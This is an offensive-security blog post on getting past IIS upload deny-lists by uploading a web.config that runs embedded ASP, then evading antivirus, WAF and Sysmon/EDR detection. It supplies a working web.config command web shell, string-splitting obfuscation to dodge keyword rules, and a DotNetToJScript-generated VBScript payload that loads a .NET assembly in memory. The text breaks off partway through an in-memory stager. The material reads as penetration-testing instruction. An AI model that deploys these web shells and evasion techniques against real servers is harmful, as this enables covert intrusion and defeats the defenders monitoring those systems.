---
layout: post
Title: "Bypass Upload Restrictions and Evade Detection"
---
Let's be honest, bypassing upload restrictions is not something new and usually involves different methods to achieve the same goal: execute your 1337 code on your victim; But you can't always do this without getting caught by the Blue Team.

On this post I'll be showing a combination of an old technique to bypass upload restriction on ASP/.NET applications and some ways to evade detection.

## Step 1 - Bypass Upload Restrictions

It's really common to find applications that ~~still~~ use a deny list to restrict file extension, boiling down to a battle between your creativity and the developer's imagination. Usually you would find that the list contains most of the "bad" extensions:

 `"html,htm,php,php2,php3,php4,php5,phtml,pwml,inc,asp,aspx,ascx,jsp,cfm,cfc,pl,bat,exe,com,dll,vbs,js,reg,cgi,htaccess,asis,sh,shtml,shtm,phtm,cfc,cfm,cfml,cfr,cfswf,jsp,jws"`
 
But hey, what if we use something that does not appear to be bad? Presenting: **web.config**.  According to [MS](https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-5.0), "The web.config is a file that is read by IIS and the ASP.NET Core Module to configure an app hosted with IIS". 

Remember that I said something about an old technique? This is it! On 2014 a researcher (@irsdl) shared this technique, which I believe to be the first person to publicly write about it _(don't quote me on that)_ - You can read it more here: [Upload a web.config File for Fun & Profit](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/). 

The technique is pretty straightforward, we upload a file named **web.config** that sets a special handler to interpret our own file with the ASP script processor, this will make code inside web.config be executed by IIS as a valid ASP file. 

**Don't break things:** It's important to mention that things may break if you replace an already existent config file, I would recommend you to try to upload this file to a different folder than the application root. This file usually contains critical information like DB connection strings, rules to application path and so on, so be careful. 

Simple "Hello World" with this technique:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% 
Response.write("Hey there!")
%>
-–>

```
Visiting this with your browser should look like the image below, note that our code was inside the "<% %>".

![](/images/post02-01.PNG)

We can see our message printed right at the end, but this is not what we want, let's abuse this to achieve remote code execution!

## Step 2 - How to ~~not~~ get caught

This step depends a lot on the security posture of the company you are testing, but lets go through what you may find.

### Antivirus - The first layer and sometimes only layer of protection

 Companies tend to trust a lot on AV solutions, the first thing you must deal is how to drop something on disk that wont trigger detection. From my own experience, you can pretty much combine string dictionaries, eval, execute functions to break this first layer ~~(or don't just simply copy stuff from github)~~.
 
Let's examine what this would look like.

Searching on the interwebs (AKA google) we find the simplest and yet functional ASP web shell: https://github.com/tennc/webshell/blob/master/asp/webshell.asp.

Adding our XML (from web.config) and removing some HTML lines resulted in the code below:

{% highlight vb %}
<?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
<!–-
<% 

Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)

%>
{% endhighlight %}

And voila.. we have a simple web shell:

![post02-02](/images/post02-02.png)

But wait, are we safe to use this code already? 
Won't AV solutions flag us? **Yes** and **No**! 

Running the original code against [VirusTotal results on 15](https://www.virustotal.com/gui/file/06d9ff9671a3a5fb180d7337bddfc0119fd449d14b7ebc3a789298147b22bfaa/detection) detections but [ours a big 0](https://www.virustotal.com/gui/file/a630bfe24837c208b439a8f4876ae1013a0ba4cb7f1bdf270fc9428a6d8b2007/detection). 

**No detection at all!**

![post02-03](/images/post02-03.png)

**How, you ask?** 

![](https://media.tenor.com/images/9f005edb649e847cc9250fbce91d4b23/tenor.gif)

A detection on this level may be due to a couple of factors that will vary depending on the AV running on the host. 

We extracted only the essential part of the original web shell, which means that the detections were probably focusing on the whole file (generally done by looking at the file hash) or specific parts of it (like a specific string contained on that script), as an AV would do with other forms of "malware".

### How AV detects your Web Shell

You may find cases where AVs will flag your file if you carry something as simple as a string called "Mimikatz" to the combination of specific functions, file reputation and even run our file in some cloud sandbox. In general, security solutions won't ~~or shouldn't~~ just simply flag your file because it uses "WSCRIPT.SHELL" or has a string called "cmd". 

<html><blockquote class="twitter-tweet"><p lang="en" dir="ltr">When your program name is more the new EICAR than a security tool <a href="https://t.co/ldZkKzgHGW">https://t.co/ldZkKzgHGW</a></p>&mdash; 🥝 Benjamin Delpy (@gentilkiwi) <a href="https://twitter.com/gentilkiwi/status/1161684030108119042?ref_src=twsrc%5Etfw">August 14, 2019</a></blockquote> </html>

**The takeaway from this:**

- A simple change into a known payload was enough to evade detection from Antivirus solutions. 
- Understating how AVs flag files should guide you on how to modify and even create your own payloads. 
- Sometimes AVs will flag stupid things, you just have to test it before using in a real target (information gathering goes a long way) and be creative on how to bypass it.

In short, if you are trying to use something that already exists on your kali machine without any modifications, chances are **you will be caught.** 

### WAF - Nice web shell you've got here bro, we wouldn't want anything to happen to it.

There is one additional defense layer not mentioned so far that could make your life a bit difficult: **WAF** (Web Application Firewall); Some have rules to block your attempt to upload files that may contain combination of known strings used in a web shell. 

In a couple of engagements I found that you may combine the same techniques to evade both WAF and AVs. Let's examine how this works.

With WAF bypasses I like to start with the following routine:

1. **Understand how the WAF blocks your request** - This may vary to a simple redirect, error message, challenge & response mechanism. It's important to understand how this is presented, usually sending a simple SQLI payload will do the trick for you to see this behaviour. 
2. **Test your Payload** - You don't actually need to wait to test your payload directly on your vulnerable point. Use a different IP in a different page, run some tests with fragments of your payload and see how it responds.
3. **Repeat -**  Test your payload a couple of times before using against your target.

I always like to code some python script to help me with this task, and I usually break every piece of my payload into small strings to list the parts that will give me trouble when D-day arrives. 

To illustrate it better let's imagine that we just sent our payload and got caught by the WAF. Doing the process I've described we broke our code into small pieces and discovered that the word "**CreateObject**" triggered the rule. 

What can we do about it?

#### String Dictionary to the rescue

We can transform our string into something that will only make sense when executed. There's a couple of ways to achieve this and I'll be showing you the easiest way:

{% highlight vb %}
Dim x
x = Split("a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s",",")
Execute("Set oScript = "+x(2)+"reate"+x(14)+"bject(""WSCRIPT.SHELL"")")
{% endhighlight %}

With "Split()" we created a simple dictionary that can then be used to create the strings that are getting blocked. The "Execute()" acts in the same way as an "Eval()", but in this context the code will be treated as a simple assignment statement whereas with eval it would result in a comparison ([you can read more here](https://docs.microsoft.com/en-us/previous-versions//0z5x4094(v=vs.85)?redirectedfrom=MSDN)). 

Do this with every piece of _"bad"_ string and you are good to go.

## Step 3 - Evade Detection

Making our payload undetectable by AV and WAF solutions should be enough to evade most detections, but more and more we see the usage of tools like [sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) to detect binaries launched by IIS and Apache.

Before going further, let's first understand how this type of detection works. 

For this, we'll use [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) and interact with our web shell.

To keep things simple, add a filter (ctrl+l) to display only entries for Process name "w3wp.exe" and "cmd.exe":

![post02-04](/images/post02-04.png)

Then, execute a simple "whoami" command with our webshell. 

Eventually, you will see an entry for "Process Create" operation for "cmd.exe" from the "w3wp.exe" binary:

![post02-05](/images/post02-05.png)

Examining further, we can see the executed command along with it's parameters:

![post02-06](/images/post02-06.png)

This is exactly what sysmon and some EDR solutions will look for. So there goes all the work we put into getting our code executed.

If you record from our code, we are using a reference to the "WScript.Shell" object, which is simply calling the binary passed with the "exec" method. In our case: `"cmd /c <COMMAND>"` - that's why we see that "cmd.exe" is been called to execute whatever command executed by our web shell.

One may think that the simple thing here would be to replace cmd with some other binary, maybe the most recent sexy addition on the [LOLBAS](https://lolbas-project.github.io/#) project, but we are essentially doing the same thing.

Let's drop our DLL stager on disk and use rundll32 to execute it:

`rundll32.exe C:\inetpub\wwwroot\application\notsuspicious.dll,Start`

Aaaand.... as you can see:

![post02-07](/images/post02-07.png)

We are still using "w3wp.exe" to spawn processes:

![post02-08](/images/post02-08.png)

The question is, can we execute our stager directly without needing to spawn a new process? 

## Step 4 - Run our code

For this task we'll be using **DotNetToJScript**. You can read more about this awesome project here: https://github.com/tyranid/DotNetToJScript.

Let's start by introducing something that many people don't know: **ASP Classic** is essentially a server-side script engine that uses **VBScript** as it's default scripting language.

With **DotNetToJScript** we can not only create payloads for JScript but also for VBScript, and that's exactly what we'll be doing.

To start, you can clone the repository directly from github and open it with Visual Studio.

### Writing a Simple Payload

You can use an already existing example project "ExampleAssembly" that comes inside with the tool, and write the necessary code for your reverse shell or go even further and use Win32 API to inject shell code for your favorite C2 implant. 

I'll be doing something simple for this post and write a file to disk:

![post02-09](/images/post02-09.png)

Now, rebuild the entire solution... and we should have both **DotNetToJScript** binary and **ExampleAssembly** DLL ready to go.

### Generating VBS Payload

Since we are using the TestClass example that comes with the tool, we can execute the following command:

`.\DotNetToJScript.exe ExampleAssembly.dll -o="output.vbs" --ver=None --lang=VBScript`

The first parameter (ExampleAssembly.dll) is our payload created in the last step, then our output location and some options. I recommend you testing the best option for you, since this may variate accordingly to your target, but `--ver=None` will result in a version without "WSCRIPT.SHELL", which is exactly what we want. 

Since we are going with the default script engine, VBScript, we are passing `--lang=VBScript`.

And that's it, just copy and past to our "web.config" and execute it:

{% highlight vb %}
<?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
<!–-
<% 
Sub DebugPrint(s)
End Sub

Sub SetVersion
End Sub

Function Base64ToStream(b)
  Dim enc, length, ba, transform, ms
  Set enc = CreateObject("System.Text.ASCIIEncoding")
  length = enc.GetByteCount_2(b)
  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
  Set ms = CreateObject("System.IO.MemoryStream")
  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
  ms.Position = 0
  Set Base64ToStream = ms
End Function

Sub Run
Dim s, entry_class
s = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"
s = s & "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
s = s & "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"
s = s & "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"
s = s & "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
s = s & "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"
s = s & "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"
s = s & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"
s = s & "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"
s = s & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"
s = s & "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"
s = s & "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"
s = s & "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"
s = s & "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"
s = s & "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"
s = s & "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"
s = s & "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"
s = s & "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"
s = s & "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"
s = s & "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
s = s & "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"
s = s & "ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"
s = s & "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAqSoQYAAAAAAA"
s = s & "AAAA4AAiIAsBMAAACAAAAAgAAAAAAADuJwAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"
s = s & "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAnCcA"
s = s & "AE8AAAAAQAAADAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAGQmAAAcAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"
s = s & "AAAALnRleHQAAAD0BwAAACAAAAAIAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAADAQAAABA"
s = s & "AAAABgAAAAoAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"
s = s & "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAANAnAAAAAAAASAAAAAIABQB0IAAA8AUAAAEAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZgIoDgAACgAA"
s = s & "cgEAAHByKQAAcCgPAAAKAComAAMoEAAACiYqQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAA"
s = s & "BQBsAAAA4AEAACN+AABMAgAASAIAACNTdHJpbmdzAAAAAJQEAABEAAAAI1VTANgEAAAQAAAAI0dV"
s = s & "SUQAAADoBAAACAEAACNCbG9iAAAAAAAAAAIAAAFHFQAACQAAAAD6ATMAFgAAAQAAABEAAAACAAAA"
s = s & "AgAAAAEAAAAQAAAADgAAAAEAAAACAAAAAABzAQEAAAAAAAYA4wDYAQYAUAHYAQYAMACmAQ8A+AEA"
s = s & "AAYAWACOAQYAxgCOAQYApwCOAQYANwGOAQYAAwGOAQYAHAGOAQYAbwCOAQYARAC5AQYAIgC5AQYA"
s = s & "igCOAQYAHAKHAQYAHQAKAAoAFAKmAQAAAAABAAAAAAABAAEAAQAQAAcCAAA9AAEAAQBQIAAAAACG"
s = s & "GKABBgABAGogAAAAAIYAEQIQAAEAAAABAG4BCQCgAQEAEQCgAQYAGQCgAQoAKQCgARAAMQCgARAA"
s = s & "OQCgARAAQQCgARAASQCgARAAUQCgARAAWQCgARAAYQCgARUAaQCgARAAcQCgARAAeQCgAQYAgQAp"
s = s & "AhoAiQAjAiAALgALAC8ALgATADgALgAbAFcALgAjAGAALgArAHUALgAzAJ8ALgA7AJ8ALgBDAGAA"
s = s & "LgBLAKUALgBTAJ8ALgBbAJ8ALgBjAMoALgBrAPQAQwBbAAEBBIAAAAEAAAAAAAAAAAAAAAAANgIA"
s = s & "AAIAAAAAAAAAAAAAACYAFAAAAAAAAgAAAAAAAAAAAAAAJgCHAQAAAAAAAAAAADxNb2R1bGU+AFN5"
s = s & "c3RlbS5JTwBtc2NvcmxpYgBGaWxlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBD"
s = s & "b21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1h"
s = s & "cmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3Vy"
s = s & "YXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJl"
s = s & "bGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHly"
s = s & "aWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxp"
s = s & "dHlBdHRyaWJ1dGUAcGF0aABFeGFtcGxlQXNzZW1ibHkuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVj"
s = s & "dGlvbgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZp"
s = s & "Y2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAVGVzdENs"
s = s & "YXNzAFJ1blByb2Nlc3MAT2JqZWN0AFN0YXJ0AFdyaXRlQWxsVGV4dABFeGFtcGxlQXNzZW1ibHkA"
s = s & "AAAAJ2MAOgBcAHQAZQBtAHAAXABpAHQAdwBvAHIAawBzAC4AdAB4AHQAABlIAGUAbABsAG8AIABX"
s = s & "AG8AcgBsAGQAIQAAAIVUN9T4WmVMnBjh7sS7LhEABCABAQgDIAABBSABARERBCABAQ4EIAEBAgUA"
s = s & "AgEODgUAARJFDgi3elxWGTTgiQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93"
s = s & "cwEIAQAHAQAAAAAUAQAPRXhhbXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3Ig"
s = s & "RG90TmV0VG9KU2NyaXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAx"
s = s & "NwAAKQEAJDU2NTk4ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAA"
s = s & "AAUBAAEAAAAAAAAAqSoQYAAAAAACAAAAHAEAAIAmAACACAAAUlNEUyaBjRgFixJPmfMCVzSwEw4B"
s = s & "AAAARDpcU29mdHdhcmVzXERvdE5ldFRvSlNjcmlwdFxFeGFtcGxlQXNzZW1ibHlcb2JqXERlYnVn"
s = s & "XEV4YW1wbGVBc3NlbWJseS5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEJwAAAAAAAAAAAADeJwAAACAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAA0CcAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAA"
s = s & "AAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAA"
s = s & "AAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAALADAAAAAAAAAAAAALADNAAA"
s = s & "AFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAA"
s = s & "AAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBv"
s = s & "AAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQQAwAAAQBTAHQAcgBpAG4A"
s = s & "ZwBGAGkAbABlAEkAbgBmAG8AAADsAgAAAQAwADAAMAAwADAANABiADAAAABiACUAAQBDAG8AbQBt"
s = s & "AGUAbgB0AHMAAABFAHgAYQBtAHAAbABlACAAQQBzAHMAZQBtAGIAbAB5ACAAZgBvAHIAIABEAG8A"
s = s & "dABOAGUAdABUAG8ASgBTAGMAcgBpAHAAdAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBl"
s = s & "AAAAAAAAAAAASAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEUAeABhAG0A"
s = s & "cABsAGUAQQBzAHMAZQBtAGIAbAB5AAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAx"
s = s & "AC4AMAAuADAALgAwAAAASAAUAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABFAHgAYQBtAHAA"
s = s & "bABlAEEAcwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAYgAfAAEATABlAGcAYQBsAEMAbwBwAHkAcgBp"
s = s & "AGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAASgBhAG0AZQBzACAARgBvAHIAcwBoAGEA"
s = s & "dwAgADIAMAAxADcAAAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAA"
s = s & "AAAAUAAUAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUA"
s = s & "QQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAA"
s = s & "AEUAeABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUA"
s = s & "cgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQBy"
s = s & "AHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAADwNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
s = s & "AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"
s = s & "bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"
entry_class = "TestClass"

Dim fmt, al, d, o
Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add Empty

Set d = fmt.Deserialize_2(Base64ToStream(s))
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)

End Sub

SetVersion
On Error Resume Next
Run
If Err.Number <> 0 Then
  DebugPrint Err.Description
  Err.Clear
End If
%>
-–>
{% endhighlight %}

As expected, after execution the file is created:

![post02-11](/images/post02-11.png)

Now, back to process monitor.. if we filter only "Process Create" operations and run our web shell again, we get 0 results:

![post02-12](/images/post02-12.png)

Now, you may think that we are done.. **but we are not.** (cry face)

Remember from "Step 2" that some AVs may create detection based on the usage and pattern of known malicious files and scripts?

![post02-13](/images/post02-13.png)

We could try to apply what I've showed so far, but let's learn another useful technique to avoid detection.

### Can you pls execute my code sir?

Sometimes the best way to avoid detection is to use something that is not malicious at all. Our payload has multiple objects to functions that reveal our intend, from the moment we drop it on disk we give a chance for security solutions to trigger detections and even permit responders to act on it. 

So let's create something that will serve as a stager for our payload, the easiest way to achieve this is to have enough code to receive and execute our code directly into memory.

Since we are using classic ASP, we can receive our payload using the "Request()" function, decode it's Base64 content and execute with a combination of "Execute()" and "Eval()".

{% highlight vb %}
<?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="new_policy" path="*.config" verb="GET,POST" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers><security><requestFiltering><fileExtensions><remove fileExtension=".config" /></fileExtensions><hiddenSegments><remove segment="web.config" /></hiddenSegments></requestFiltering></security></system.webServer><appSettings></appSettings></configuration>
<!–-
<% 
Dim mom
mom = Split("a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s",",")

Private Function sbts(Binary)
